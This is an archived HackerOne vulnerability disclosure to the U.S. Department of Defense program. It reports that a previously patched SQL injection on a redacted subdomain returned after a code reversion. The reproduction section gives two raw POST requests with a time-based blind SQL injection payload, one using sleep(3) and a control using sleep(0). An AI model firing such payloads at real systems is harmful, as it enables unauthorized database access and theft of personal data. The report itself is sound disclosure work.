---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2019-10-08
submitted: 2018-05-07T00:00:45.335Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "alyssa_herrera"
source: "https://hackerone.com/reports/348047"
title: "Code reversion allowing SQLI again in ███████"
---
# Code reversion allowing SQLI again in ███████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/348047](https://hackerone.com/reports/348047)
- CWE: SQL Injection
- Submitted: 2018-05-07T00:00:45.335Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
I just noticed that my publicly disclosed report, https://hackerone.com/reports/311922 is sstill vulnerable either a code reversion was made or something was done to revert the patch. Additionally I'd please request that the images in the report to be censored or redacted as it's been made vulnerable again.
**Description:**
A code reversion made a previously patched sql injection vulnerable, allowing attackers to once again attack and access the back end DB. 
## Impact
High
## Step-by-step Reproduction Instructions

POST /elist/email_aba.php HTTP/1.1
Host: ████████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1

lname=S&userid=admin'%2b(select*from(select(sleep(3)))a)%2b'&pw=admin

vs 

POST /elist/email_aba.php HTTP/1.1
Host: █████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://████████/
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Cookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955
Connection: close
Upgrade-Insecure-Requests: 1

lname=S&userid=admin'%2b(select*from(select(sleep(0)))a)%2b'&pw=admin

## Product, Version, and Configuration (If applicable)
N/a
## Suggested Mitigation/Remediation Actions
Take down subdomain if not needed any more

## Impact

Access database information, steal sensitive PII or information

The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Verified**
Yes

**What exploitation technique did you utilize?**
Time delay

**Please describe the results of your verification attempt.**
Observed time delays when using sleep comands

## Timeline

- **Report Filed**
- **2018-05-07** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Triaged**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
